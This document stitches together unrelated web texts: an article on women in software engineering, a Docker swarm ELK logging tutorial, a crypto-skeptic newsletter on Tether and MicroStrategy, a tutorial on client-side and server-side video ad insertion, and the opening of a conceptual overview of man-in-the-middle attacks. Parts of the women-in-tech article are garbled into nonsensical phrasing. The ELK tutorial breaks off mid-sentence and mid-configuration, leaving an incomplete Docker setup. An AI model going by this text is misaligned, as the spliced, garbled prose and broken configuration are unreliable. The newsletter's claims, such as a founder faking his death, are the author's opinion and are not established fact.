<p>Maria was motivated to succeed, but as we mentioned before, many women in <strong>software engineering</strong> decide to move to industries outside the tech domain shortly after getting their first job. We are not busting a myth here. Evidence is abundant for the fact that most of all high-ranked employees are men.<br>Part of the reason can be the already discussed reluctance of women to become software engineers. It is almost normal to see young female developers leaving their current job and switching to a different career path.<br>We know that the role of women in technology use and development is somewhat under-represented. However, it’s much more essential to recognize the need for more women to engage in activities previously associated with men stereotypes. History is rich in examples of women with stellar minds and determination. We have collectively allowed for a working environment that admits discrimination. Gender-based factors are both powerful arguments as well as liability for all parties involved. They sometimes cause damage and eventually delay our progress.<br>Companies that are more gender-neutral in their approach towards employees and businesses create a friendly ecosystem where professionals work closely with each other and learn ways to optimize their collective output as a team.<br>In contrast, <strong>gender discrimination</strong> is a recipe for a toxic work environment with seriously undermined potential. The value of any <em>Men’s club</em> is denominating with each passing day. We must be smart and quickly acknowledge gender discrimination as something we need <em>to put in our calendars</em>.<br>Of course, if too much energy goes into denouncing some of the patriarchy-based business models, the opposite effect is due. We can see the impact in companies whose mission is to turn their female employees into relentless business warriors.</p>
<div>
<blockquote>
<p>We need to understand that if we all work on inclusion together, it’s going to be faster, broader, better, and more thorough than anything we can do on our own.</p>
</blockquote>
<p>Former Reddit CEO + Current Co-Founder of Project Include</p>
</div>
<h2>Focus on belief</h2>
<p>The level of confidence of women has very much detrimental to their success rate. One such woman brings the statistical part of gender distribution in the workforce to another level — she created a <a href="https://docs.google.com/spreadsheets/d/1BxbEifUr1z6HwY2_IcExQwUpKPRZY3FZ4x4ZFzZU-5E/edit#gid=0" target="_blank" rel="nofollow">spreadsheet with about 80 different companies</a> and their man/women employee ratio. I’m very eager to point out that these numbers represent not <em>all the women</em> in a company, but <em>all the women who are software engineers.</em> This spreadsheet is a fine example of how science can help us use data to better deal with a century-old problem.<br>Women are fully equipped <em>to do well in IT</em>. Sara Gottlieb proves that a strong belief is at the base of success. She is the software engineer behind <em>SurveyMonkey</em>. Sara is an excellent software engineer who decided she didn’t have enough on her plate already and started learning more about <strong>engineering management</strong>. Not long after that, she became a recognized mentor in Hackbright Academy, teaching programming classes to other women.<br>Focus on belief is a powerful success tool, significantly when others recognize it and support it. Joyce Jang was encouraged by both men and women in her company to pursue her career advancement. Having a lady in high positions is excellent makes the real difference. It also sets a healthy pace for all men. </p>
<h2>Less Shy, More Direct</h2>
<p>Caroline Tess, a VP, has been trapped under a male dominance sea before realizing her best card. She says that when making a conversation, she tries to stay as clear and assertive as possible while maintaining directness and presence. Speaking up, especially when you have a valid argument, helps understand your work potential and your identity as a professional. Speak up and be heard!<br>Women are somewhat less competitive than the testosterone-driven men, who are creative enough to turn anything into a fierce competition. Women are less likely to demand recognition or honor but just as <em>equally entitled to it</em>.<br>Joyce Stack, an engineer advocate in Mendeley, says the best recommendation for women and visitors to surrender is to ask for something acceptable to them. It is what Stack did to get a major position in programming testing. “After the meeting, they asked the spot if there were any additional inquiries, and I requested this activity.” “Because you are considering it, no one will give you anything. You need to open your mouth and question.”</p>
<h2>Find a coach or a supporter</h2>
<p>Ladies looking to ascend the career ladder and reach leadership positions line up with male <em>and</em> female coaches and supporters.<br>Maria perceived the significance of having a coach right off the bat. It kept on searching them out all through her profession, remembering for her developer functions at eBay and Microsoft. Besides, she established a versatile web-based media stage Flockish and Anecdote, an inventive photograph network bought by Samsung.<br>She claims that your guide can’t be an arbitrary person.<br><em>“You need to discover somebody that acknowledges you and your abilities,</em>”<br>she clarifies.<br><em>“Your mentor better be a senior who can convey their knowledge and perspective.”</em><br><em>“That is the secret to escaping a reality where work becomes more of a minefield than a healthy environment for personal and professional development.”</em></p>
<h2>Talk to Female Role Models</h2>
<p>Women continue to prove they can lead and be excellent role models – most examples from history ring true even today. The world’s top female developers now are just as stellar as those <a href="https://wiredelta.com/the-history-of-women-in-software-and-programming/" target="_blank" rel="nofollow">from our not so distant past</a>. Creating a LinkedIn profile and contacting other female software engineers is an incredible way to strengthen your network and widen advancement opportunities. Start a discussion with a female professional and share some views about your personal experience and professional interests. You will be amazed at the freedom and openness level when it comes to getting help from peers.</p>
<h2>Be Bold for Change</h2>
<p>The International Women’s Day is bringing awareness with the <strong>#BeBoldForChange</strong>. Change happens when we get to work in full swing. We urge you to learn improvement, attend tech opportunities, work tirelessly, value yourself, and be confident in fulfilling your potential. </p>

        <p>In this tutorial you’ll see how to set up easily an ELK (<strong>E</strong>lastic, <strong>L</strong>ogstash, <strong>K</strong>ibana) stack to have a
centralized logging solution for your Docker swarm cluster.</p>

<p>Below you’ll find the full stack to have a working ELK stack on your docker swarm.</p>
<div><pre><code data-lang="yaml"><span>version</span>: <span>'3'</span>

<span>services</span>:
  <span>elasticsearch</span>:
    <span>image</span>: elasticsearch:<span>7.9.3</span>
    <span>environment</span>:
      - discovery.type=single-node
      - ES_JAVA_OPTS=-Xms2g -Xmx2g
    <span>volumes</span>:
      - esdata:/usr/share/elasticsearch/data
  <span>kibana</span>:
    <span>image</span>: kibana:<span>7.9.3</span>
    <span>depends_on</span>:
      - elasticsearch
    <span>ports</span>:
      - <span>"5601:5601"</span>
  <span>logstash</span>:
    <span>image</span>: logstash:<span>7.9.3</span>
    <span>ports</span>:
      - <span>"12201:12201/udp"</span>
    <span>depends_on</span>:
      - elasticsearch
    <span>deploy</span>:
      <span>mode</span>: global
    <span>volumes</span>:
      - logstash-pipeline:/usr/share/logstash/pipeline/
<span>volumes</span>:
  <span>esdata</span>:
    <span>driver</span>: local
  <span>logstash-pipeline</span>:
    <span>driver</span>: local
</code></pre></div><p>I will break down the configuration part to explain what’s going on:</p>
<hr>
<div><pre><code data-lang="yaml"><span>elasticsearch</span>:
  <span>image</span>: elasticsearch:<span>7.9.3</span>
  <span>environment</span>:
    - discovery.type=single-node
    - ES_JAVA_OPTS=-Xms2g -Xmx2g
  <span>volumes</span>:
    - esdata:/usr/share/elasticsearch/data
</code></pre></div><p>First we need to create an elasticsearch container, nothing fancy:</p>
<div><pre><code data-lang="yaml">- discovery.type=single-node
</code></pre></div><p>We need to set the discovery to <code>single-node</code> to evade bootstrap checks. See <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html#single-node-discovery">this</a> for more information.</p>
<div><pre><code data-lang="yaml">- ES_JAVA_OPTS=-Xms2g -Xmx2g
</code></pre></div><p>Here we need to increase the minimum memory for the container.</p>
<hr>
<div><pre><code data-lang="yaml"><span>kibana</span>:
  <span>image</span>: kibana:<span>7.9.3</span>
  <span>depends_on</span>:
    - elasticsearch
  <span>ports</span>:
    - <span>"5601:5601"</span>
</code></pre></div><p>This one is simple, we are creating a kibana container to view the logs. The container expose the port <code>5601</code> in order
for you to reach the dashboard. In a production context it will be better to expose kibana trough <a href="https://traefik.io/">Traefik</a>
with a <a href="https://doc.traefik.io/traefik/middlewares/basicauth/">Basic Auth</a> middleware for example.</p>
<p>The kibana container will automatically try to connect to an elasticsearch search at address <code>elasticsearch</code>. So as
long as the elasticsearch container is named <code>elasticsearch</code>, no further configuration is required to make it work.</p>
<hr>
<div><pre><code data-lang="yaml"><span>logstash</span>:
  <span>image</span>: logstash:<span>7.9.3</span>
  <span>ports</span>:
    - <span>"12201:12201/udp"</span>
  <span>depends_on</span>:
    - elasticsearch
  <span>deploy</span>:
    <span>mode</span>: global
  <span>volumes</span>:
    - logstash-pipeline:/usr/share/logstash/pipeline/
</code></pre></div><p>Final part, the logstash container. It’s the process who will collect the containers logs to aggregate them
and push them to ES.</p>
<div><pre><code data-lang="yaml"><span>ports</span>:
  - <span>"12201:12201/udp"</span>
</code></pre></div><p>The logstash process will expose a GELF UDP endpoint on port 12201, and the docker engine will push the logs to that
endpoint.</p>
<p>We will need to have one logstash agent running per node, so that container can push logs to it.</p>
<div><pre><code data-lang="yaml"><span>volumes</span>:
  - logstash-pipeline:/usr/share/logstash/pipeline/
</code></pre></div><p>We will need to setup logstash to listen on that port and forward the logs to ES. This will be done by creating
a pipeline, that we will put in this volume.</p>
<hr>
<p>Now we will need to bring up this stack:</p>
<div><pre><code data-lang="shell">creekorful@host:~$ docker stack deploy logs -c logs.yaml
</code></pre></div>
<p>Now that we have our 3 containers up and alive, we will need to configure logstash. This is done by putting the following
file <code>logstash.conf</code> into the <code>logstash-pipeline</code> volume.</p>
<pre><code data-lang="conf">input {
   gelf {
   }
}

output {
	elasticsearch {
		hosts =&gt; "elasticsearch:9200"
	}
}
</code></pre><p>This configuration will set up an <code>UDP</code> (default) GELF endpoint on port <code>12201</code> (default), and output the logs
to elasticsearch host.</p>
<p>Now we will need to kill the container so that it restart with the new configuration.</p>

<p>Now that we have our containers up and running we need to indicate to Docker to push the logs to logstash.
This can be done by two approach:</p>
<h2 id="global-configuration">Global configuration<a href="#global-configuration" arialabel="Anchor">⌗</a> </h2>
<p>We can change the Docker default logging driver to that every container created will push the logs automatically
to the logstash container. This is done by editing the <code>/etc/docker/daemon.json</code> config file.</p>
<div><pre><code data-lang="json">{
  <span>"log-driver"</span>: <span>"gelf"</span>,
  <span>"log-opts"</span>: {
    <span>"gelf-address"</span>: <span>"udp://localhost:12201"</span>
  }
}
</code></pre></div><p>Note: you can see that we are submitting the logs to <code>udp://localhost:12201</code>, this is because the logs are submitted

<p>If you prefer to configure only logging for some of your containers, this can be done individually on each stack
like this:</p>
<div><pre><code data-lang="yaml"><span>logging</span>:

<p>Now you should have a running logging mechanism.</p>

<p>Crypto has come of age. What does that mean?</p>

<p>Among other things, it means MicroStrategy CEO Michael Saylor has replaced Patrick Bryne as the new crazy god of institutional bitcoiners.&nbsp;And another crypto exit scam has been invented: <a href="https://amycastor.com/2019/02/12/how-the-hell-did-we-get-here-a-timeline-of-quadrigacx-events/" target="_blank" rel="noreferrer noopener">dying in India</a>. (See Jorge Stolfi’s full <a href="https://np.reddit.com/r/Buttcoin/comments/k42nun/when_they_say_cryptocurrency_has_comes_of_age/ge9doit/" target="_blank" rel="noreferrer noopener">reddit post</a>. He is a computer scientist in Brazil.)</p>



<p>All Ponzi schemes eventually implode, even if it takes 25 years like Bernie Madoff’s did. When that happens, you have two choices: turn yourself in or disappear. Gerald Cotten chose to disappear. Of course, many people believe he is really and truly dead. I’m just not one of them. </p>



<p>With that, here is the news that I find interesting from Bitcoinlandia, an imaginary place where people keep insisting bitcoin is not a Ponzi. </p>



<h2>MicroStrategy buys more BTC</h2>



<p>MicroStrategy continues to funnel its excess cash into bitcoin. The analytics firm bought another $50 million worth of bitcoin, Saylor disclosed in a <a href="https://twitter.com/michael_saylor/status/1334990791496884224?s=21" target="_blank" rel="noreferrer noopener">tweet</a>. </p>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">MicroStrategy has purchased approximately 2,574 bitcoins for $50.0 million in cash in accordance with its Treasury Reserve Policy, at an average price of approximately $19,427 per bitcoin. We now hold approximately 40,824 bitcoins.<a href="https://t.co/nwZcM9zAXZ">https://t.co/nwZcM9zAXZ</a></p>— Michael Saylor (@michael_saylor) <a href="https://twitter.com/michael_saylor/status/1334990791496884224?ref_src=twsrc%5Etfw">December 4, 2020</a></blockquote></div>
</div></figure>



<p>MicroStrategy bought its most recent pile of bitcoins at an average price of $19,427—at the top of the market—and now owns a total of 40,824 bitcoins.  </p>



<p>Here’s the thing: Saylor holds 73% of the voting stock of MicroStrategy, so he does not need buy-in from stockholders to make decisions.&nbsp;He is ruler and king, and if he wants <em>his firm</em> to buy more bitcoin, so be it. </p>



<p>Saylor also has a large private stash of bitcoins. I would be very curious to know how much BTC he owned <em>before and after</em> MicroStrategy’s recent purchase.&nbsp;&nbsp;</p>



<p>If those bitcoin hold their value, all will be fine, Jorge Stolfi <a href="https://www.reddit.com/r/Buttcoin/comments/k6zfx5/microstrategy_just_purchased_an_additional_2574/georccd/" target="_blank" rel="noreferrer noopener">said</a> on Reddit. But, if BTC “drops back to $8,000, the other stockholders will be upset, and may have grounds to sue Michael for mismanagement or whatever—even if there are no other shenanigans. If he did sell his coins while the company bought them, it will be worse.”</p>



<h2>Guggenheim Partners</h2>



<p>Another institutional investor has jumped on the bitcoin bandwagon. In a recent <a href="https://sec.report/Document/0001628280-20-016852/gft112020485afidoc.htm" target="_blank" rel="noreferrer noopener">SEC filing</a>, Guggenheim Partners, a leading Wall Street investment firm, revealed that it is looking to invest 10% of its $5.3 billion Macro Opportunities Fund<a href="https://www.guggenheiminvestments.com/mutual-funds/fund/gioix-macro-opportunities" target="_blank" rel="noreferrer noopener"> into Grayscale’s Bitcoin Trust.</a></p>



<p>To be clear, Guggenheim is not buying bitcoin directly. It plans to invest nearly $500 million in GBTC shares. Grayscale itself now owns <a href="https://cointelegraph.com/news/grayscale-now-has-half-a-million-bitcoin" target="_blank" rel="noreferrer noopener">more than 500,000 bitcoin</a>. </p>



<p>And Guggenheim isn’t taking on any risk. The firm makes money whether the price of BTC goes up or down. The retailers who are invested in the fund are the ones who carry all the risk. </p>



<p>Bitcoin is highly volatile and has no role in retail investor portfolios. As Economist Nouriel Roubini explained in a lengthy <a href="https://twitter.com/Nouriel/status/1331980212502978560" target="_blank" rel="noreferrer noopener">Twitte</a><a href="https://twitter.com/Nouriel/status/1331980212502978560">r</a> rant:</p>



<p>“Investing in BTC is equivalent to [taking] your portfolio to a rigged illegal casino &amp; [gambling]; at least in legit Las Vegas casinos odds aren’t stacked against you as those gambling markets aren’t manipulated the way BTC is. Instead BTC is manipulated heavily by Tether &amp; whales.”</p>



<h2>Tether’s runaway train </h2>

<p>On to my favorite topic: Tether—a firm that mints a dollar-pegged stablecoin that’s hugely popular on unbanked exchanges.</p>



<p>On Nov. 28, Tether surpassed 19 billion tethers in circulation. And like a runaway train with no way of stopping, it is fast on its way to issuing 20 billion tether—worth the notional equivalent in US dollars. </p>



<p>So, what is going on with the New York Attorney General’s investigation into Tether and Bitfinex? </p>



<p>The last bit of real news we had was in September when Judge Joel M. Cohen once again ordered Bitfinex and Tether to <a href="https://www.coindesk.com/bitfinex-tether-nyag-hearing">turn over financials</a>. However, he did not set a deadline. He left that decision to a special referee, according to <a href="https://www.coindesk.com/bitfinex-tether-nyag-hearing">Coindesk</a>. And we haven’t heard anything on the matter since. </p>



<p>Stepping back, recall that Bitfinex/Tether have been resisting handing over documents since November 2018 when the NYAG—in pursuant to the Martin Act, which gives it broad powers to investigate fraud—first served subpoenas for information stretching back to January 2015.</p>



<p>In April 2019, when the NYAG was concerned that iFinex (parent company of Bitfinex/Tether) was insolvent and Bitfinex was dipping into Tether’s cash reserves, it sought an ex parte order compelling the companies to produce documents and staying further actions pending the ongoing investigation. </p>



<p>iFinex responded with a motion to dismiss. In August 2019, the Supreme Court denied the motion and the respondents sought to appeal, arguing that the NYAG did not have the power to demand documents since Bitfinex and Tether didn’t have sufficient contacts in New York. </p>



<p>In July 9, 2020, a New York state appeals court sided with the&nbsp;NYAG. <a href="https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=Q3WRjXshN15Y4902MCAfjw==">(Court filing)</a></p>



<p>As I’m writing up this newsletter, Coindesk’s <a href="https://twitter.com/nikhileshde/status/1335705545051877378">Nikhilesh De</a> has just pulled up a <a href="https://iapps.courts.state.ny.us/nyscef/ViewDocument?docIndex=A7OmCd1LNbrQaRdGxJAzYQ==">new court filing</a> in the case from Dec. 4 that is a bit bewildering. At first glance, it appears to be the same filing from July, repeated twice.</p>



<figure><div>

</div></figure>



<p>Drew Hinks, a lawyer not involved in the case, <a href="https://twitter.com/propelforward/status/1335717224775102465">said</a> the filing is a <a href="https://gyazo.com/2db04c63d45e83e2b8dd1a91f72950a5">remittitur</a>—a jurisdictional document that formally ends the life of an appeal by notifying the world that the decision is final. </p>



<p>I’ll update this post as I learn more—specifically why a remittitur is important after the appellate judgment has already been issued and become final. Does this help the investigation going forward? </p>



<p><em>(Update: I am pretty sure that the remittitur was just a procedural thing that signals that the appellate court is done and has kicked the ball back to the original court—i.e., Justice Cohen.)</em></p>



<h2>Bitcoin’s sets new all-time high</h2>



<p>On Nov. 30, the price of bitcoin reached $19,900 on Coinbase, according to <a href="https://www.theblockcrypto.com/linked/85577/bitcoin-set-new-all-time-high">the Block</a>, surpassing its previous all time high (ATH) set on Dec. 17, 2017, by about $10. </p>



<p>After bitcoin reached its new high, it promptly lost 13% of its value. </p>



<p>When you see bitcoin getting pumped like this, what you are seeing is traders cashing out before the bubble bursts. Bitcoin is not a company. It does not create any actual revenue. Cash coming into the system goes to paying the miners, who sell their 900 newly minted BTC per day and earlier investors lucky enough to sell at the right time. </p>



<p>I’m sure the current pump has nothing to do with the NYAG getting closer to exposing Tether/Bitfinex’s inner workings, the <a href="https://www.nytimes.com/2020/10/01/technology/bitmex-bitcoin-criminal-charges.html">recent indictment</a> of BitMEX operators, and Binance’s latest efforts to <a href="https://www.theblockcrypto.com/post/84020/binance-blocking-us-users-exchange-email-2">aggressively block</a> U.S. citizens from using its exchange. </p>



<h2>Binance pulls in big profits</h2>



<p>The largest tether exchange expects to earn between $800 million and $1 billion in profits for 2020, its captain Changpeng Zhao (“CZ”) <a href="https://www.bloomberg.com/news/articles/2020-12-03/binance-ceo-changpeng-zhao-crypto-s-influence-miner-bloomberg-50-2020">told Bloomberg</a>. The Malta-registered exchange also expected <a href="https://news.bitcoin.com/crypto-exchange-binance-expects-up-to-1-billion-profit-in-2018/">$1 billion in profits 2018</a>.</p>



<p>Speaking of Binance, the crypto exchange is <a href="https://www.coindesk.com/binance-sues-forbes-for-defamation">suing Forbes and two journalists</a> for a recent report claiming that the exchange had a plan to dodge regulations. (Here is the <a href="https://www.docdroid.net/PEikRJX/binance-complaint-pdf">complaint</a>.) It’s unlikely CZ will get anywhere with this lawsuit because the suit will get torn apart in discovery.  </p>



<p>Similar to when <a href="https://bitcoinmagazine.com/articles/bitfinex-critics-prepare-possible-legal-action-after-cryptocurrency-exchange-lawyers">Bitfinex threatened to sue</a> prolific critic Bitfinex’ed in December 2017, this is likely more of warning to other journalist: don’t dig too deep, or we’ll come after you.</p>



<h2>STABLE Act</h2>



<p>The big news of the week is that three congressional democrats are trying to pass a bill that will require stablecoin issuers to comply with the same regulations and rules as banks. </p>



<p>If passed, the&nbsp;Stablecoin Tethering and Bank Licensing Enforcement (STABLE) Act, would require stablecoin issuers to apply for bank charters, get approval from the Federal Reserve and hold FDIC insurance.&nbsp;(<a href="https://tlaib.house.gov/sites/tlaib.house.gov/files/STABLEAct.pdf">The bill</a>, <a href="https://tlaib.house.gov/media/press-releases/tlaib-garcia-and-lynch-stableact">press release</a>.) </p>



<p>Stablecoin issues are like wild cat banks. Back in the 1800s banks would issue their own currency, and nobody knew what was backing the currency. And because these banks were often in remote, hard to get to locations, people often had trouble redeeming their notes for silver or gold or whatever it was that was supposed to be backing them. </p>

<p>Advertising-based monetization is a popular way for content providers to monetize their content and drive their online video revenues. Technically, there are two important ways of inserting ads into videos – CSAI (Client-Side Ad Insertion) and SSAI (Server-Side Ad Insertion).</p>



<p><strong>CSAI works by making calls from the video player to an ad server that responds with the ad. On the other hand, SSAI works by inserting (or stitching) the ad media directly into the video stream, avoiding the need for making calls to a server to receive ads.</strong></p>



<p>In this tutorial, let us look at how CSAI and SSAI work, the main differences, and each’s pros and cons.</p>



<p>Let’s go!</p>



<hr>



<h2>What is CSAI: Client-Side Ad Insertion </h2>



<p><strong>CSAI </strong>(Client-Side Ad Insertion) is the method of delivering ads to clients (desktop, mobile, CTVs, gaming consoles, etc.) where the client (video player) requests the ad server for an ad when it reaches certain ad-markers in the stream or in the manifest (HLS/DASH). </p>



<p>Upon receiving the request from the client, the ad server responds with the “right” ad for the client based on data collected from the client and other information (campaigns, preferences, etc.). The video player then pauses the video, plays the ad (or group of ads), and then resumes video playback (if any). It is also the responsibility of the client to report on the ad metrics (playback, quartiles, interactives, etc.)</p>







<hr>



<h2>How does CSAI (Client-Side Ad Insertion) Work?</h2>



<p>In this section, let’s take a look at how CSAI (Client-Side Ad Insertion) works. It is easily understood from the schematic below from the IAB’s <a href="https://iabtechlab.com/wp-content/uploads/2019/06/VAST_4.2_final_june26.pdf" target="_blank" rel="noopener">VAST 4.2 specification</a>. </p>

After the ad playback, the video player continues playing the video stream.  </li><li>Streaming platforms usually embed their video players with SDKs provided by 1st or 3rd party ad verification services. These SDKs track the position of the ad playback, completion rates, errors, etc., and report back to servers periodically with this information. </li></ol>



<p>As you can see, the heavy-lifting for CSAI is at the client-side and this architecture comes with its own set of advantages and disadvantages. We’ll take a look at them when we discuss the pros/cons of SSAI and CSAI. </p>



<p>For now, let’s move on to SSAI and understand how it works.</p>



<hr>



<h2>What is SSAI: Server-Side Ad Insertion </h2>



<p><strong>SSAI </strong>(a.k.a Dynamic Ad Insertion or DAI) is a way of stitching an ad directly into the video that is being streamed – at the server and not the client. It is fundamentally different from how CSAI works (which relies on the client doing the heavy-lifting). </p>



<p>SSAI has its advantages and disadvantages that we shall see in the next couple of sections.</p>



<p>The primary advantage is that since the client is no longer making any server calls, it is hard to block ads inserted using SSAI. However, SSAI does have a more complicated workflow and it is hard to provide the level of personalization and interactivity as CSAI. Let’s take a look at how SSAI works to understand more.</p>



<hr>



<h2>How does SSAI (Server-Side Ad Insertion) Work?</h2>



<p>Let’s look at how SSAI (Server Side Ad Insertion) works. Here is a schematic from the IAB’s <a href="https://iabtechlab.com/wp-content/uploads/2019/06/VAST_4.2_final_june26.pdf" target="_blank" rel="noopener">VAST 4.2 specification</a>.</p>







<p>Before that, lets take a look at ad markers which are critical to the functioning of either CSAI or SSAI. </p>



<ol><li>Before a video (or live transmission) is sent to the transcoders, the stream is decorated with baseband markers called SCTE-104 markers.</li><li>When the encoder compresses the video, it translates the SCTE-104 markers into&nbsp;<a rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/SCTE-35" target="_blank">SCTE-35 markers</a>&nbsp;that are carried with the compressed bitstream. These markers indicate the position of ad breaks (apart from other events) in video streams.</li><li>The video is then packaged into&nbsp;<a href="https://ottverse.com/hls-http-live-streaming-how-does-it-work/">HLS</a>/DASH for&nbsp;<a href="https://ottverse.com/what-is-abr-video-streaming/">ABR streaming</a>, and the manifest locations are made known to the CMS so that the player can access them at the time of playback. The manifests also contain information about the ads that need to be played back (the position, URIs, etc.).</li></ol>



<p>Now, let’s take a look at what happens when the user presses play on his device. </p>



<ol><li>The user presses “play” on his device to begin video playback. Typically, the player will contact the CDN to get a copy of either the HLS or DASH manifests to start the playback session. However, in SSAI, it will typically get the manifest from the ad-insertion service that stores the video manifest after decorating it with ad-related information. </li><li>When the player asks for the manifest, it will (typically) also provide some information about itself (i.e., the viewer’s location, subscription-levels, etc.) to enable personalized ad-delivery. Players generally provide the “<strong>X-Device-User-Agent</strong>” and “<strong>X-Device-IP</strong>” HTTP headers, as per the IAB VAST guidelines. Additional data can be provided if the player is set up to do so by the SSAI vendor.</li><li>When the ad-insertion service detects that an ad-marker is reached or is coming up, it contacts the&nbsp;<strong>Ad Decisioning server</strong>, whose duty is to supply the ad for insertion.</li><li>The Ad Decisioning Server then uses various bits of information such as the data sent from the player at the start of the playback session, ad campaigns, etc., to get an ad out of the inventory and pass it on to the Ad Insertion server.</li><li>The Ad Insertion server then transcodes the ad to match the video’s bitrate ladder, packages, and produces a manifest for the ad, and stitches the ad’s manifest into the video’s manifest.</li><li>When the player gets this refreshed manifest, it seamlessly delivers the ad as if it were delivering any other video! After the ad completes, the video player continues playing the content without any interruptions or breaks.</li><li>Apart from this, the player can be modified to report on the ad playback to ad-tracking services. i.e., client-side reporting for server-side ad insertion.</li></ol>



<p>I hope by now you’ve understood how both CSAI and SSAI work. Obviously, they have their own advantages and disadvantages. In the next section, let’s take a look at these in detail.</p>

<h2>Differences between CSAI and SSAI : Pros and Cons</h2>



<p>After understanding how CSAI and SSAI work, let’s take a look at the big differences between each of these approaches and the pros and cons as well. </p>

<h3>Pros of CSAI </h3>



<ol><li>CSAI provides a lot of options for <strong>dynamic, rich-media ad</strong> experiences using <a href="https://ottverse.com/what-is-vpaid-video-player-ad-interface-definition/">VPAID (deprecated)</a> and SIMID. Publishers and Advertisers can create rich experiences (like surveys, click-throughs, overlays, etc.) using traditional client-side ad serving technologies.</li><li><strong>Rich tracking and metrics</strong>: It is quite easy to set up very detailed tracking in the case of CSAI. Using the VAST XML, players can report on the quartiles of completion, clicks, click-throughs, etc. providing a lot of data for ad-tracking services. </li><li><strong>Highly-personalized ads</strong>: using a plethora of data sources and information, highly personalized ads can be served using CSAI technology. </li></ol>







<h3>Cons of CSAI</h3>



<ol><li><strong>Latency</strong>: the life of CSAI starts with the player requesting an ad-server for an ad and then waiting for that ad to be delivered. This inherently induces latency and can frustrate the viewer. </li><li><strong>Buffering</strong>: inherently, the ad is served from a different origin than the video in the CSAI paradigm. If the ad-server is not well-tuned and the video player does not request the correct bitstream (if the ad was transcoded into multiple variants), then the ad can start buffering which will surely frustrate the end-user. </li><li><strong>Ad Blockers</strong>: it is common to see ad-blocking technology in browsers preventing ad playback causing a loss of revenue for the publishers and advertisers. The player has to make explicit API calls to ad servers, pause video playback, and start ad playback. Using this information, ad blocking technology can easily block ad playback. </li><li><strong>Heavy on the client</strong>: Because the client has to treat an ad differently from a video, the work of the client increases and so does the size of its code-base. If you add tracking code to such clients, then the size increases even more. Furthermore, ad tech vendors have to also support a wide range of clients (HTML5, Android, iOS, Roku, gaming consoles, etc.) to ensure that their customers can get revenue from all their platforms. </li><li><strong>Variable video quality between content and ads.</strong>: since the ad inventory is not necessarily matched with the content in terms of bitrates, and resolutions, it is possible that the quality of the ad and the video can differ causing a poor user …</li></ol></div></div></article></main></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Cyber threats seem to be everywhere in this digital era. Viruses, malware, ransomware, trojans, phishing and a lot more make a never ending list of cyber threats. But one of the most prevalent threats out there that often gets overlooked is manipulator-in-the-middle (previously referred to as ‘man-in-the-middle’) attack.</p><p>While using the internet, we expect our communications to be confidential and not to be changed or tampered while in transit. When you are submitting some sensitive data to a web application, you rely on the assumption that:</p><ol><li><p>everything you have entered is valid,</p></li><li><p>all the data reaches the server in its correct form, and</p></li><li><p>third parties cannot see, intercept or change your data.</p></li></ol><p>But the fact is that a man-in-the-middle (MITM) attack breaks either one of the last two assumptions or both.</p><p>If the connections you make to websites and online services are not secure, you could be vulnerable to security risks such as phishing, fraud, impersonation, malware, and many others.</p><h2 id="the-beginning-and-the-present">The Beginning and The Present</h2><p>Intercepting and altering communication has happened for centuries, and the advent of the internet and further development has made it easier than ever for criminals to inject their interests into private transmissions.</p><p>During the late-16th century, letters related to an assasination plot against Queen Elizabeth I of England by Mary Stauart and her fellow conspirators were intercepted, decoded and modified by a cryptography expert named Thomas Phelippes. This happens to be one of the earliest MITM attacks on record.</p><p>In 2018, Russian spies attempted a MITM attack on the headquarters of the Organisation for the Prohibition of Chemical Weapons (OPCW).</p><p>In 2019, the national government of Kazakhstan attempted to introduce an internet surveillance system. The goal of the State security officials was to protect Kazakh users from hacker attacks, online fraud and other kinds of cyber threats. The certificate allowed users’ traffic to be intercepted by the government, circumventing encryption used by email and messaging applications.</p><p>Recently, the personal data of more than 12,000 Indian blood donors were on offer on the clear web for free. It was found by risk monitoring firm CloudSEK.</p><p>The leak might have been possible because of an unsecured HTTP site that was intercepted by third parties or an exposed database or cloud storage bucket, or even a phishing campaign that succeeded in accessing system admin credentials.</p><p><img src="https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/800x494.png" srcset="https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/810x500.png 810w, https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/750x463.png 750w, https://beaglesecurity.com/blog/images/resized/blogmim.png-40da136/800x494.png 800w" sizes="(min-width: 1029px) 600px, 100vw" alt="Respondcr"></p><p>MITM attacks usually take two forms:</p><p>The first is where an adversary may want to read the content of a message which is often said to be an attack on confidentiality.</p><p>The second would involve the adversary changing the content of the message or otherwise modifying the communication which is said to be an attack on integrity.</p><p>Man-in-the-middle attacks involve the physical proximity to the intended target or it involves a malicious software or malware. For example, the client or user receives a mail which includes a link to a bank site, from the “man-in-the-middle“ or the attacker which appears to be a legitimate one.</p><p>When you click on the link and log in, you are actually passing your credentials and data to the attacker. And this type of attack includes phishing also.</p><h2 id="types-of-man-in-the-middle-attacks">Types of Man-in-the-Middle Attacks</h2><p>A MITM attack is essentially an eavesdropping situation in which a third party or an adversary secretly inserts itself into a two-party conversation to gather or alter information. MITM attacks can affect any communication exchange, including device-to-device communication and connected objects (IoT).</p><p>Generally, man-in-the-middle attacks can be categorized into two:</p><h3 id="active-session-attack">Active session attack</h3><p>During an active session attack, the attacker stops the original client from communicating with the server and then replaces himself within the session.</p><p>From this point onwards, the attacker will be communicating with the server and he will be able to do anything that a normal user can do. He could tamper the data or collect sensitive information that may have a potential impact later.</p><h3 id="passive-session-attack">Passive session attack</h3><p>In a passive session attack, the attacker monitors the data flowing across the network without interrupting the actual communication. The intruder eavesdrops the communication but does not modify the message stream in any way. He could collect all the data passing through the network which may cause an active attack later.</p><h2 id="techniques-used-in-man-in-the-middle-attacks">Techniques Used in Man-in-the-Middle Attacks</h2><p>Some of the common man-in-the-middle attack techniques used are:</p><h3 id="rogue-access-point">Rogue Access Point</h3><p>A rogue access point is a device that is operating on the network without the authorization of an administrator, posing a security threat. They are set up to trick computers that automatically connect to Wi-Fi by posing as legitimate public networks. These rogue networks often monitor traffic and steal sensitive information.</p><p>The attacker could use this rogue access point as a public Wi-Fi of a coffee shop to control and intercept every communication passing through that network.</p><h3 id="address-resolution-protocol-arp-spoofing">Address Resolution Protocol (ARP) Spoofing</h3><p>ARP is a communication protocol used to find out the MAC address of a particular device whose IP address is known. If a device wants to communicate with another device on the network, then the sending device uses ARP to find the MAC address of the device that it 